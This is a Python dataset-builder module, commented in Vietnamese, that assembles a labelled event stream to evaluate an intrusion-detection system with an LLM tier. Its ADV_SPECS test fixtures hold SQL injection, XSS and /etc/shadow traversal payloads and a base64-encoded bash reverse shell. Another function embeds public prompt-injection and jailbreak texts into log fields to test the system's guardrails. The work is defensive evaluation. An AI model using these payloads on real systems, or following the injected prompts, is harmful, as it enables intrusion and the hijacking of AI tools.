"""
SENTINEL — Bộ dựng DỮ LIỆU GỘP dùng chung (Unified Dataset Builder).
====================================================================
Module TRUNG LẬP chứa toàn bộ logic dựng luồng gộp (CICIDS + DAPT2020 + Zero-day
REAL-DERIVED) đã sắp theo thời gian. Trước đây code này nằm trong
`evaluate_unified_stream.py` (file EVAL offline) và bị các nơi khác import NGƯỢC
("lòng vòng"). Tách ra đây để CẢ đường online (`scripts/build_demo.py`,
`scripts/build_datatest.py` → `scripts/demo.py`/`push_datatest.py`), eval offline
(`evaluate_unified_stream.py`) và các thí nghiệm rigor cùng import từ 1 chỗ.

Ngoài `build_stream()`, module này cũng là NGUỒN DUY NHẤT của `enrich()`,
`determine_queue()` và `build_sequence()` (kế thừa từ `stream_unified_online.py`
đã gỡ bỏ) — mọi script push/demo và test đều import từ đây, KHÔNG copy tay.

Mọi sự kiện đều là DATA THẬT: CICIDS từ `ground_truth.json`, DAPT từ
`dapt2020_chains.jsonl`. Zero-day là biến thể REAL-DERIVED (nền benign THẬT, đẩy
ĐÚNG một feature Welford lên cực trị) — xem `_build_zerodays`.
"""

import json
import math
import os
import sys
from collections import defaultdict

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.tier1_filter.rule_engine import RuleEngine  # noqa: E402

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
GT_PATH = os.path.join(ROOT, "experiments", "ground_truth.json")
DAPT_PATH = os.path.join(ROOT, "data", "processed", "dapt2020_chains.jsonl")

THREAT_ACTIONS = {"BLOCK_IP", "ALERT", "AWAIT_HITL", "ESCALATE"}
BENIGN_ACTIONS = {"DROP", "LOG"}
# Hành động DUY NHẤT đẩy sự kiện lên tầng trên (Cổng ML -> LLM). Lấy thẳng từ đường chạy
# thật: `subscriber.py` bọc toàn bộ nhánh Cổng ML/LLM trong `if action == "ESCALATE"`, và
# chính nó đếm mọi hành động khác là "đã gỡ tải". `BLOCK_IP` là điểm CUỐI, không phải leo thang.
ESCALATE_ACTION = "ESCALATE"
BENIGN_PHASES = {"Benign", "benign", "Normal", "normal", "", None, "Unknown"}


# --------------------------------------------------------------------------- #
# Helpers
# --------------------------------------------------------------------------- #
def _safe_int(v, default=0):
    try:
        f = float(v)
        return int(f) if math.isfinite(f) else default
    except (TypeError, ValueError):
        return default


def _safe_float(v, default=0.0):
    """float() an toàn cho CSV CICIDS: header lặp giữa file (giá trị = tên cột),
    'Infinity'/NaN đều trả default thay vì ném ValueError giết cả build_stream."""
    try:
        f = float(v)
        return f if math.isfinite(f) else default
    except (TypeError, ValueError):
        return default


def _is_threat(action: str) -> bool:
    return action in THREAT_ACTIONS


# Số dòng tối đa quét MỖI file CICIDS raw khi lấy mẫu đa-ngày (giữ RAM bị chặn; đủ để
# bắt các cụm tấn công + benign của ngày đó). Xử lý từng ngày một -> đỉnh RAM ~1 ngày.
RAW_DAY_SCAN_ROWS = 250_000

# Cổng well-known -> tên dịch vụ THẬT (tín hiệu luồng trung thực, thay cho gán cứng "HTTP").
_PORT_SERVICE = {
    21: "FTP",
    22: "SSH",
    23: "TELNET",
    25: "SMTP",
    53: "DNS",
    80: "HTTP",
    110: "POP3",
    143: "IMAP",
    443: "HTTPS",
    445: "SMB",
    3389: "RDP",
    8080: "HTTP",
}


def _infer_service_from_port(port) -> str:
    """Suy dịch vụ TỪ CỔNG THẬT (honest flow signal). Cổng lạ -> PORT_<n> (để Tier-2 thấy
    đúng là cổng phi chuẩn, không nguỵ trang thành HTTP)."""
    p = _safe_int(port)
    return _PORT_SERVICE.get(p, f"PORT_{p}")


def map_cicids(nl: dict) -> dict:
    """network_layer (ground_truth) -> schema CICIDS mà RuleEngine mong đợi."""
    # Trả về toàn bộ các key trong nl, đảm bảo tính đồng bộ với ML pipeline
    res = nl.copy()

    # Chuẩn hoá các key cũ nếu có (dành cho ground_truth.json cũ)
    mapping = {
        "src_ip": "Source IP",
        "dst_ip": "Destination IP",
        "dst_port": "Destination Port",
        "protocol": "Protocol",
        "flow_duration_us": "Flow Duration",
        "fwd_packets": "Total Fwd Packets",
        "bwd_packets": "Total Backward Packets",
        "fwd_bytes": "Total Length of Fwd Packets",
        "bwd_bytes": "Total Length of Bwd Packets",
        "flow_pkts_s": "Flow Pkts/s",
        "fwd_seg_size_min": "Fwd Seg Size Min",
        "init_fwd_win_byts": "Init Fwd Win Byts",
        "init_bwd_win_byts": "Init Bwd Win Byts",
        "bwd_pkt_len_min": "Bwd Pkt Len Min",
        "psh_flag_cnt": "PSH Flag Cnt",
    }

    for old_k, new_k in mapping.items():
        if old_k in res and new_k not in res:
            res[new_k] = res.pop(old_k)

    return res


def static_only_action(engine: RuleEngine, log: dict) -> str:
    """Đối chứng STATIC-ONLY (chỉ luật tĩnh, KHÔNG Welford) cho zero-day.

    LƯU Ý: đây KHÔNG phải "Config A" của Ablation Study — Config A trong
    `run_ablation.py --mode af` là Tier-1 ĐẦY ĐỦ không LLM (bao gồm cả Welford).
    Baseline này tách riêng Welford ra để chứng minh đóng góp của Z-score."""
    port = _safe_int(log.get("Destination Port"))
    fwd = _safe_int(log.get("Total Fwd Packets"))
    if port in engine.sensitive_ports:
        return "BLOCK_IP"
    if engine._check_waf_signatures(log) or engine._check_injection_signatures(log):
        return "BLOCK_IP"
    if fwd > engine.max_fwd_packets:
        return "ALERT"
    return "DROP"


# --------------------------------------------------------------------------- #
# Zero-day REAL-DERIVED: nền là flow benign THẬT, chỉ đẩy MỘT feature Welford lên
# cực trị. Mỗi spec: (id, tên, feature đẩy, giá trị cực trị, IP đích ngoài (narrative
# exfil/C2), MITRE, ngày tiêm). KHÔNG đẩy "Total Fwd Packets" vì > max_fwd_packets sẽ
# bị luật TĨNH bắt -> mất tính "signature-less". Rải qua nhiều ngày + nhiều loại outlier.
# --------------------------------------------------------------------------- #
ZD_SPECS = [
    (
        "ZD-001",
        "Exfil khối lượng Bwd cực lớn",
        "Total Length of Bwd Packets",
        50_000_000,
        "203.0.113.9",
        "T1048 Exfiltration Over Alternative Protocol",
        2,
    ),
    (
        "ZD-002",
        "Beacon tần suất gói cực cao",
        "Flow Pkts/s",
        750_000.0,
        "198.51.100.7",
        "T1071 Application Layer Protocol (C2)",
        2,
    ),
    (
        "ZD-003",
        "Tunnel cửa sổ Bwd bất thường",
        "Init Bwd Win Byts",
        65_000_000,
        "192.0.2.55",
        "T1572 Protocol Tunneling",
        3,
    ),
    (
        "ZD-004",
        "Phiên kéo dài bất thường (low&slow)",
        "Flow Duration",
        9_000_000_000,
        "203.0.113.77",
        "T1041 Exfiltration Over C2 Channel",
        3,
    ),
    (
        "ZD-005",
        "Bùng nổ gói Bwd (volumetric mới)",
        "Total Backward Packets",
        900_000,
        "198.51.100.42",
        "T1498 Network Denial of Service (novel)",
        4,
    ),
    (
        "ZD-006",
        "Payload Fwd khổng lồ",
        "Total Length of Fwd Packets",
        80_000_000,
        "192.0.2.200",
        "T1030 Data Transfer Size Limits",
        4,
    ),
    (
        "ZD-007",
        "Cửa sổ Fwd dị thường",
        "Init Fwd Win Byts",
        60_000_000,
        "203.0.113.150",
        "T1095 Non-Application Layer Protocol",
        5,
    ),
    (
        "ZD-008",
        "C2 Beacon cực nhỏ và ẩn",
        "Total Length of Bwd Packets",
        20,
        "203.0.113.88",
        "T1071.001 Web Protocols",
        1,
    ),
    (
        "ZD-009",
        "Cửa sổ Fwd âm (anomaly)",
        "Init Fwd Win Byts",
        -10,
        "198.51.100.99",
        "T1059 Command and Scripting Interpreter",
        2,
    ),
    (
        "ZD-010",
        "Gói SYN liên tục siêu nhỏ",
        "Fwd Seg Size Min",
        1,
        "192.0.2.11",
        "T1046 Network Service Discovery",
        3,
    ),
    (
        "ZD-011",
        "Mảnh payload Bwd quá to",
        "Bwd Pkt Len Min",
        15000,
        "203.0.113.111",
        "T1071 Application Layer Protocol",
        4,
    ),
    (
        "ZD-012",
        "C2 PSH Flag chìm",
        "PSH Flag Cnt",
        9999,
        "192.0.2.222",
        "T1573 Encrypted Channel",
        5,
    ),
    (
        "ZD-013",
        "Burst Fwd packets đột biến",
        "Total Fwd Packets",
        995,
        "203.0.113.33",
        "T1498 Network Denial of Service",
        1,
    ),
    (
        "ZD-014",
        "Time delay khổng lồ",
        "Flow Duration",
        10_000_000_000,
        "198.51.100.22",
        "T1102 Web Service",
        3,
    ),
    (
        "ZD-015",
        "Exfil gián đoạn Bwd burst",
        "Total Length of Bwd Packets",
        15_000_000,
        "192.0.2.99",
        "T1048 Exfiltration",
        4,
    ),
]

ADV_SPECS = [
    (
        "ADV-001",
        "SQL Injection ngụy trang Unicode",
        "payload",
        "SELECT * FROM users WHERE username = %s AND 1=1",
        "10.0.0.88",
        "T1190 Exploit Public-Facing Application",
        2,
    ),
    (
        "ADV-002",
        "XSS chèn qua header",
        "payload",
        "<svg/onload=alert(1)>",
        "10.0.0.89",
        "T1190 Exploit Public-Facing Application",
        3,
    ),
    (
        "ADV-003",
        "Command Injection dạng mã hóa Base64",
        "payload",
        "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS84MDgwIDA+JjE=",
        "10.0.0.90",
        "T1059 Command and Scripting Interpreter",
        4,
    ),
    (
        "ADV-004",
        "Dir Traversal nhiều cấp độ",
        "payload",
        "../../../../../../../etc/shadow",
        "10.0.0.91",
        "T1190 Exploit Public-Facing Application",
        5,
    ),
]

# User-Agent THẬT THƯỜNG GẶP — dùng cho probe zero-day/adversarial.
# TRƯỚC ĐÂY hai bộ dựng gắn `zero-day-probe/<id>` và `adv-probe/<id>`: chuỗi đó đi thẳng
# vào prompt LLM (user_agent là trường hợp lệ, không bị lọc nhãn) và TỰ KHAI đây là mẫu
# thử. Mọi phán quyết "phát hiện được zero-day" sau đó đều vô giá trị vì mô hình chỉ cần
# đọc User-Agent. Định danh vẫn được giữ ở `zd_id`/`adv_id` — hai khoá NÀY bị loại trước
# khi lên LLM, nên vẫn truy vết hậu kiểm được mà không lộ đáp án.
_REALISTIC_UAS = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "Version/17.4 Safari/605.1.15",
    "python-requests/2.31.0",
    "curl/8.5.0",
)


def _build_csic(tkey, limit: int):
    """Nạp request HTTP THẬT của CSIC 2010 (`data/csic.json`) vào luồng.

    THAY THẾ hai nguồn BIÊN SOẠN đã gỡ (`webattack` 69 mẫu + `grayzone` 18 mẫu). Vì sao gỡ:
    chúng từng là nguồn DUY NHẤT mang bằng chứng tầng ứng dụng trong luồng, nên mọi chỉ số
    "quy kết kỹ thuật" của đồ án đứng trên 69 mẫu do CHÍNH TÁC GIẢ viết ra — cỡ mẫu quá nhỏ
    và tự ra đề tự chấm, đúng chỗ phản biện bắt trước tiên.

    CSIC 2010 là ~61.000 request HTTP THẬT đánh vào một ứng dụng thương mại điện tử thật.
    Nhãn loại tấn công + mã ATT&CK do `scripts/build_csic_dataset.py` suy ra bằng bộ luật
    viết ĐỘC LẬP với `_WAF_PATTERNS` của Tier-1 (dùng chữ ký của hệ thống để sinh đáp án rồi
    chấm chính hệ thống là lập luận vòng tròn). Bản ghi không khớp họ nào để TRỐNG mã kỹ
    thuật — vẫn chấm được PHÁT HIỆN, nhưng bị loại khỏi phần chấm QUY KẾT.

    Khoá nhãn mang tiền tố `wa_` (giữ nguyên quy ước của nguồn cũ) nên tự động bị
    `subscriber._LABEL_KEY_PREFIXES` tước trước khi vào prompt LLM.
    """
    path = os.path.join(ROOT, "data", "csic.json")
    if limit <= 0:
        return []
    # KHÔNG trả rỗng lặng lẽ. Lỗi thật đã xảy ra: `data/demo.json` được dựng lúc 13:52:56
    # còn `data/csic.json` mãi 13:52:58 mới ghi xong, nên nhánh này trả `[]` và luồng demo
    # 99.867 sự kiện ra đời với ĐÚNG 0 bản ghi CSIC — không một cảnh báo nào. Hệ quả đo
    # được: toàn bộ tầng bằng chứng ứng dụng biến mất, 96% ca AWAIT_HITL dồn về tầng flow,
    # và người đọc tưởng đó là điểm yếu của mô hình chứ không phải lỗi dựng dữ liệu.
    if not os.path.exists(path):
        raise FileNotFoundError(
            f"Yêu cầu {limit} sự kiện CSIC nhưng KHÔNG thấy {path}.\n"
            "Dựng trước rồi hãy dựng luồng:\n"
            "    .venv/bin/python scripts/build_csic_dataset.py --limit 4000"
        )
    with open(path, encoding="utf-8") as f:
        rows = json.load(f)

    out = []
    for i, ev in enumerate(rows[:limit]):
        lab = ev.get("_label") or {}
        log = {k: v for k, v in ev.items() if k != "_label"}
        day = 2 + (i % 4)
        out.append(
            {
                "id": f"CSIC-{ev.get('csic_index', i):05d}",
                "name": lab.get("gt_label", ""),
                "mitre": lab.get("wa_mitre", ""),
                "expected_action": lab.get("wa_expected_action", ""),
                "source": "csic",
                "day": day,
                "t": tkey(day),
                "log": log,
                "expected_threat": bool(lab.get("expected_threat")),
                "label": lab.get("gt_label", ""),
            }
        )
    return out


# --------------------------------------------------------------------------- #
# ĐỐI KHÁNG NHẮM VÀO LLM (prompt injection / jailbreak)
# --------------------------------------------------------------------------- #
# Hai kho văn bản CÔNG KHAI đã tải sẵn về `data/adversarial_llm/raw/` (xem
# `scripts/download_raw_attacks.py`). Đây là câu chữ do NGƯỜI KHÁC công bố, KHÔNG phải
# tác giả tự soạn — khác hẳn hai nguồn `grayzone`/`webattack` đã bị gỡ.
_ADV_LLM_CORPORA: tuple[tuple[str, str, str], ...] = (
    ("deepset_prompt_injections.json", "prompt_injection", "deepset/prompt-injections"),
    ("jackhhao_jailbreaks.json", "jailbreak", "jackhhao/jailbreak-classification"),
)

# Bốn trường VĂN BẢN mà một bản ghi thật có thể mang. Rải đều bốn trường để chứng minh
# guardrail soi MỌI trường chuỗi (`PromptInjectionDetector.scan` duyệt hết key không bắt
# đầu bằng `_`), chứ không phải chỉ canh mỗi `message`.
_ADV_LLM_FIELDS: tuple[str, ...] = ("message", "payload", "uri", "user_agent")


def _build_adv_llm(samples, tkey, limit: int):
    """Nhúng prompt-injection/jailbreak CÔNG KHAI vào flow benign THẬT.

    VÌ SAO CẦN: `adversarial` (4 payload OWASP) là nhóm DUY NHẤT thử được lớp Guardrails,
    mà 4 mẫu thì không nói lên điều gì. Nguồn này nâng cỡ mẫu bằng văn bản tấn công có
    xuất xứ công khai, nên số liệu guardrail không còn đứng trên đầu vào tác giả tự viết.

    KHÔNG BỊA: nền mỗi bản ghi là một flow benign THẬT trong `ground_truth.json` (cùng pool
    `_build_zerodays` dùng), giữ NGUYÊN mọi đặc trưng flow. Việc duy nhất là đặt một chuỗi
    tấn công công khai vào MỘT trường văn bản, và đổi IP nguồn để truy vết được.

    ĐÁP ÁN LÀ `AML.T0051`, KHÔNG PHẢI Ô TRỐNG. Kho tri thức đúng là có 0 mục `AML.*` (toàn
    bộ 433 mục là ATT&CK Enterprise), nhưng đường đi của họ ATLAS ĐÃ được thiết kế miễn neo
    RAG: `nodes._grounded(..., from_curated=True)` cho mã `AML.*` đến từ bảng thủ công
    `attack_mapper.WEB_ATTACK_MAP` đi thẳng qua lá chắn, và `prompts.py` ép mọi tấn công
    nhắm vào chính AI về `BLOCK_IP`. Ngoại lệ HẸP đúng chỗ: free-text của LLM KHÔNG được
    hưởng, nên `AML.T9999` model tự bịa vẫn bị chặn.

    JAILBREAK CŨNG LÀ `AML.T0051` — không phải `AML.T0054`. `_ATTACK_KEYWORDS` gom
    "jailbreak"/"roleplay_bypass"/"harmful_behavior" vào chung khoá `prompt_injection`, nên
    hệ thống KHÔNG có đường nào sinh ra `AML.T0054`. Đặt đáp án là mã hệ thống không thể
    sinh thì đó là chấm sai đề, không phải đo. Hạn chế này (gộp hai kỹ thuật ATLAS làm một)
    phải nêu khi báo cáo, chứ không giấu bằng cách bịa nhãn đẹp hơn.
    """
    if limit <= 0:
        return []

    raw_dir = os.path.join(ROOT, "data", "adversarial_llm", "raw")
    texts: list[tuple[str, str, str]] = []  # (văn bản, loại tấn công, xuất xứ)
    for fname, atk_type, origin in _ADV_LLM_CORPORA:
        path = os.path.join(raw_dir, fname)
        if not os.path.exists(path):
            continue
        with open(path, encoding="utf-8") as f:
            rows = json.load(f)
        for r in rows:
            s = r if isinstance(r, str) else str(r.get("text") or r.get("prompt") or "")
            if s.strip():
                texts.append((s.strip(), atk_type, origin))

    if not texts:
        raise FileNotFoundError(
            f"Yêu cầu {limit} sự kiện đối kháng LLM nhưng {raw_dir} trống.\n"
            "Tải trước:  .venv/bin/python scripts/download_raw_attacks.py"
        )

    # Trộn TẤT ĐỊNH hai kho (không random seed trôi nổi): xen kẽ để cả prompt_injection lẫn
    # jailbreak đều có mặt dù `limit` nhỏ.
    by_type: dict[str, list] = defaultdict(list)
    for t in texts:
        by_type[t[1]].append(t)
    order: list[tuple[str, str, str]] = []
    lists = [by_type[k] for k in sorted(by_type)]
    for i in range(max(len(v) for v in lists)):
        for v in lists:
            if i < len(v):
                order.append(v[i])

    # Nền benign THẬT — cùng tiêu chí "static-clean" của `_build_zerodays`.
    SENSITIVE = {21, 22, 23, 53, 139, 445, 3389}
    pool = []
    for s in samples:
        inp = s.get("input", {})
        if inp.get("cicids_label", "") != "Benign":
            continue
        nl = inp.get("network_layer", {})
        if not nl or _safe_int(nl.get("dst_port")) in SENSITIVE:
            continue
        pool.append(nl)

    out = []
    for n in range(min(limit, len(order))):
        text, atk_type, origin = order[n]
        base_nl = pool[(n * 41) % len(pool)] if pool else {"dst_port": 443, "service": "HTTPS"}
        log = map_cicids(base_nl)  # flow benign THẬT làm nền
        # `n // 2`, KHÔNG phải `n % 4`. `order` xen kẽ hai kho theo chu kỳ 2 (chẵn=jailbreak,
        # lẻ=prompt_injection), nên `n % 4` khiến {message, uri} chỉ nhận jailbreak còn
        # {payload, user_agent} chỉ nhận prompt_injection — hai biến dính chặt nhau, đọc số
        # ra không biết chênh lệch đến từ TRƯỜNG hay từ LOẠI tấn công. Chia đôi trước rồi mới
        # chia trường thì mỗi trường nhận đủ cả hai loại.
        field = _ADV_LLM_FIELDS[(n // 2) % len(_ADV_LLM_FIELDS)]
        log[field] = text
        # DẢI RIÊNG 198.18.0.0/15 (RFC 2544, dành cho benchmark — không ai định tuyến thật).
        # LỖI ĐÃ SỬA: bản trước dùng `172.16.x.x`, TRÙNG dải của DAPT2020 — đo được 4 IP
        # đụng độ trong luồng 3.300 (172.16.0.25/.43/.151/.235). Hậu quả không nhỏ: một
        # IP vừa mang prompt injection vừa mang flow nguồn khác, nên lệnh chặn IP đè lên
        # cả hai và mọi thống kê tính theo IP bị nhiễm chéo.
        log["Source IP"] = f"198.18.{(n // 250) % 250}.{n % 250}"
        log["user_agent"] = log.get("user_agent") or _REALISTIC_UAS[n % len(_REALISTIC_UAS)]
        out.append(
            {
                "id": f"ADVLLM-{n:04d}",
                "name": f"LLM {atk_type}",
                "mitre": "AML.T0051",  # cả jailbreak — xem docstring
                "source": "adv_llm",
                "adv_type": atk_type,
                "adv_origin": origin,
                "adv_field": field,
                "day": 1 + (n % 5),
                "t": tkey(1 + (n % 5)),
                "log": log,
                "expected_threat": True,
                "label": "Attack",
            }
        )
    return out


def _build_zerodays(samples, tkey, repeat: int = 1):
    """Sinh zero-day REAL-DERIVED từ flow benign THẬT.

    Nền mỗi mẫu là một flow benign THẬT trong ground_truth, chọn các flow "static-clean"
    (cổng KHÔNG nhạy cảm + fwd <= max_fwd_packets + không signature) để luật TĨNH chắc
    chắn bỏ sót. Chỉ ĐÚNG MỘT feature Welford bị đặt lên cực trị (outlier signature-less);
    mọi feature flow KHÁC giữ NGUYÊN giá trị thật. Chỉ IP (truy vết nội bộ + đích ngoài
    cho narrative) là được đặt lại — IP không ảnh hưởng tới Z-score nên không làm sai lệch.

    repeat: mỗi spec áp lên NHIỀU nền benign THẬT khác nhau (cycle qua pool) + IP nguồn
    RIÊNG -> nhân số lượng probe cho demo tải lớn. KHÔNG bịa flow: nền 100% thật, chỉ đẩy
    1 feature outlier tài liệu hoá + đổi IP (replay signature-less từ nhiều nguồn).
    """
    SENSITIVE = {21, 22, 23, 53, 139, 445, 3389}
    pool = []
    for s in samples:
        if s.get("input", {}).get("cicids_label", "") != "Benign":
            continue
        nl = s.get("input", {}).get("network_layer", {})
        if not nl:
            continue
        if _safe_int(nl.get("dst_port")) in SENSITIVE:
            continue
        if _safe_int(nl.get("fwd_packets")) > 1000:
            continue
        pool.append(nl)

    out = []
    n = 0
    for r in range(max(1, repeat)):
        for i, (zid, name, feat, val, dst, mitre, day) in enumerate(ZD_SPECS):
            if pool:
                base_nl = pool[(n * 37 + r * 13) % len(pool)]  # rải đều nền benign, tất định
            else:
                base_nl = {"dst_port": 443, "fwd_packets": 40, "service": "HTTPS"}
            log = map_cicids(base_nl)  # flow benign THẬT làm nền
            log[feat] = val  # đẩy ĐÚNG 1 feature lên cực trị
            uid = zid if repeat == 1 else f"{zid}-{r:03d}"
            log["Source IP"] = f"10.{r % 250}.{(i * 7) % 250}.{(220 + i) % 254}"  # nguồn riêng
            log["Destination IP"] = dst  # đích ngoài (narrative exfil/C2)
            # UA THƯỜNG GẶP — KHÔNG tự khai là probe (xem _REALISTIC_UAS). Định danh `uid`
            # đi ở `zd_id`, vốn bị loại trước khi lên LLM.
            log["user_agent"] = _REALISTIC_UAS[n % len(_REALISTIC_UAS)]
            out.append(
                {
                    "id": uid,
                    "name": f"Zero-Day {name}",
                    "mitre": mitre,
                    "source": "zeroday",
                    "base_feature": feat,
                    "day": day,
                    "t": tkey(day),
                    "log": log,
                }
            )
            n += 1
    return out


# --------------------------------------------------------------------------- #
# Build unified, time-ordered event stream
# --------------------------------------------------------------------------- #


def _build_adversarials(tkey):
    out = []
    for i, (aid, name, _feat, val, dst, mitre, day) in enumerate(ADV_SPECS):
        log = {
            "Source IP": f"10.0.0.{100 + i}",
            "Destination IP": dst,
            "Destination Port": 80,
            "Protocol": 6,
            "service": "HTTP",
            "message": val,  # DAPT/WAF style payload
            # UA THƯỜNG GẶP — KHÔNG tự khai là probe. Định danh `aid` đi ở `adv_id`.
            "user_agent": _REALISTIC_UAS[i % len(_REALISTIC_UAS)],
        }
        out.append(
            {
                "id": aid,
                "name": f"Adversarial {name}",
                "mitre": mitre,
                "source": "adversarial",
                "day": day,
                "t": tkey(day),
                "log": log,
                "expected_threat": True,
                "label": "Attack",
            }
        )
    return out


# 10 ngày CICIDS phủ ĐỦ 15 lớp tấn công. NGUỒN CHÂN LÝ DUY NHẤT — `build_datatest.py` và
# `build_demo.py` từng mỗi nơi giữ một bản chép tay của đúng danh sách này (3 bản), nên sửa
# một chỗ là hai chỗ kia trôi lệch mà không có gì báo.
BENCHMARK_DAYS: tuple[str, ...] = (
    "Friday-02-03-2018_TrafficForML_CICFlowMeter.csv",  # Bot
    "Friday-16-02-2018_TrafficForML_CICFlowMeter.csv",  # DoS Hulk / SlowHTTPTest
    "Thursday-15-02-2018_TrafficForML_CICFlowMeter.csv",  # DoS GoldenEye / Slowloris
    "Wednesday-21-02-2018_TrafficForML_CICFlowMeter.csv",  # DDoS HOIC / LOIC-UDP
    "Thuesday-20-02-2018_TrafficForML_CICFlowMeter.csv",  # DDoS LOIC-HTTP (tên gốc sai chính tả)
    "Wednesday-14-02-2018_TrafficForML_CICFlowMeter.csv",  # SSH / FTP-BruteForce
    "Thursday-01-03-2018_TrafficForML_CICFlowMeter.csv",  # Infiltration
    "Friday-23-02-2018_TrafficForML_CICFlowMeter.csv",  # Web BF / XSS / SQLi
    "Thursday-22-02-2018_TrafficForML_CICFlowMeter.csv",  # Web BF / XSS / SQLi
    "Wednesday-28-02-2018_TrafficForML_CICFlowMeter.csv",  # benign-heavy
)


def build_stream(
    cicids_max_rows: int = 20000,
    cicids_max_days: tuple[str, ...] = BENCHMARK_DAYS,
    dapt_max_rows: int = 5000,
    zeroday_repeat: int = 8,
    cicids_attack_ratio: float = 0.25,
    csic_max: int = 2000,
    adv_llm_max: int = 0,
):
    """Trả về (warmup_events, main_events, apt_truth, n_chains).

    MẶC ĐỊNH ĐÃ SỬA (2026-07-30) — ba khuyết tật của bộ mặc định cũ, đo được:

      1. `csic_max=0` -> luồng KHÔNG có một tấn công web nào. Chín script gọi
         `build_stream()` trần (evaluate_tier2_decision, evaluate_unified_stream,
         evaluate_rag_retrieval, run_threshold_sensitivity, run_zeroday_graded,
         run_apt_negative_control, evaluate_feedback_loop, e2e_test_runner, và chính
         module này) vì thế đo năng lực hệ thống trên luồng thuần NetFlow — trong khi
         phạm vi nghiên cứu tuyên bố hai tập: CSE-CIC-IDS2018 VÀ CSIC 2010.
      2. `cicids_max_days` chỉ có Thursday-01-03, tức CHỈ lớp Infiltration. Con số
         "25.799 sự kiện CSE-CIC-IDS2018" từng trích trong luận văn thực chất là 20.000
         dòng của MỘT lớp tấn công, chứ không phải 15 lớp. `datatest.json` lại dùng đủ
         10 ngày — hai bộ số của cùng luận văn đứng trên hai nền dữ liệu khác nhau.
      3. `zeroday_repeat=1` -> chỉ 15 mẫu zero-day, so với 360 trong datatest.

    `cicids_max_rows` là TỔNG (chia đều cho các ngày), nên phủ 10 ngày KHÔNG làm luồng
    phình: 20.000 dòng vẫn là 20.000, chỉ khác là trải trên 15 lớp thay vì dồn vào một.

    Tham số:
      cicids_max_rows: tổng dòng CICIDS raw nạp (chia đều cho các ngày) — nguồn KHỐI LƯỢNG.
      cicids_max_days: danh sách file ngày CICIDS THẬT để trích tấn công đa dạng + benign.
      dapt_max_rows:   số dòng DAPT day1 raw.
      zeroday_repeat:  nhân số zero-day real-derived (xem `_build_zerodays`).
      cicids_attack_ratio: tỉ lệ dòng TẤN CÔNG lấy mỗi ngày CICIDS (phần còn lại là benign).
        Mặc định 0.25 = hành vi cũ. Hạ xuống -> nền benign dày hơn, GIẢM số ca leo thang
        (và do đó giảm tải LLM) trong khi vẫn giữ ĐỦ 15 lớp tấn công THẬT để UI đa dạng.

    Tất cả sự kiện đều là DATA THẬT (CICIDS từ ground_truth, DAPT từ chains). Zero-day
    là biến thể REAL-DERIVED: nền là flow benign THẬT trong ground_truth, chỉ đẩy ĐÚNG
    MỘT feature lên cực trị (không dataset nào chứa zero-day có nhãn sẵn) — xem `_build_zerodays`.

    - warmup_events: 150 benign CICIDS ĐẦU để Welford học baseline trước.
    - main_events: phần benign CICIDS còn lại + TẤT CẢ tấn công CICIDS + MỌI sự
      kiện DAPT (tấn công lẫn benign nền) + zero-day, được **TRỘN XEN KẼ** trong
      từng ngày bằng khóa `t = ngày + offset golden-ratio` rồi sort — KHÔNG xếp
      khối theo nguồn.
    - apt_truth: tập IP THẬT là APT (sự kiện tấn công ở >= 2 ngày khác nhau).
    """
    with open(GT_PATH, encoding="utf-8") as f:
        gt = json.load(f)
    samples = gt if isinstance(gt, list) else gt.get("samples", gt)

    WARMUP_N = 150  # benign dành riêng cho warmup baseline
    GOLDEN = 0.6180339887498949
    _oi = [0]  # order-index dùng cho dãy golden-ratio

    def tkey(day: int) -> float:
        """Phần nguyên = ngày (giữ thứ tự đa ngày của APT); phần thập phân = dãy
        golden-ratio -> rải đều & **xen kẽ mọi nguồn** trong cùng một ngày."""
        t = day + (_oi[0] * GOLDEN) % 1.0
        _oi[0] += 1
        return t

    warmup, main = [], []

    # --- CICIDS: 150 benign -> warmup; phần còn lại TRỘN vào luồng chính --- #
    benign_seen = 0
    attack_idx = 0
    for s in samples:
        nl = s.get("input", {}).get("network_layer", {})
        if not nl:
            continue
        log = map_cicids(nl)
        label = s.get("input", {}).get("cicids_label", "")
        is_benign = label == "Benign" or s.get("expected_action", "") == "LOG"
        if is_benign:
            benign_seen += 1
            ev = {"source": "cicids", "log": log, "expected_threat": False, "label": label}
            if benign_seen <= WARMUP_N:
                warmup.append(ev)  # prefix warmup
            else:
                ev["t"] = tkey(1 + benign_seen % 5)  # benign nền, trộn khắp 5 ngày
                main.append(ev)
        else:
            ev = {"source": "cicids", "log": log, "expected_threat": True, "label": label}
            ev["t"] = tkey(1 + attack_idx % 5)
            main.append(ev)
            attack_idx += 1

    # --- DAPT2020: đưa CẢ sự kiện tấn công LẪN benign (nền) vào luồng ------ #
    apt_attack_days = defaultdict(set)
    with open(DAPT_PATH, encoding="utf-8") as f:
        chains = [json.loads(line) for line in f]
    for chain in chains:
        for e in chain.get("events", []):
            phase = e.get("phase")
            label = e.get("label", "")
            is_attack = (phase not in BENIGN_PHASES) and (label not in BENIGN_PHASES)
            ip = e.get("src_ip", chain.get("attacker_ip", ""))
            day = _safe_int(e.get("day"), 1)
            if is_attack:
                apt_attack_days[ip].add(day)  # chỉ tấn công mới tính chuỗi APT
            main.append(
                {
                    "source": "dapt",
                    "is_attack": is_attack,  # benign DAPT = nền, KHÔNG ghi memory
                    "ip": ip,
                    "dst_ip": e.get("dst_ip", ""),
                    "phase": phase,
                    "mitre_ttp": e.get("mitre_ttp", ""),  # TTP THẬT của DAPT2020 (đừng vứt đi)
                    "day": day,
                    "label": label,
                    "timestamp": e.get("timestamp", ""),
                    # flow tối thiểu, tín hiệu THẤP (mỗi sự kiện APT lẻ trông vô hại)
                    "log": {
                        "Source IP": ip,
                        "Destination IP": e.get("dst_ip", ""),
                        "Destination Port": 443,
                        "Total Fwd Packets": 20,
                    },
                    "t": tkey(day),
                }
            )

    apt_truth = {ip for ip, days in apt_attack_days.items() if len(days) >= 2}

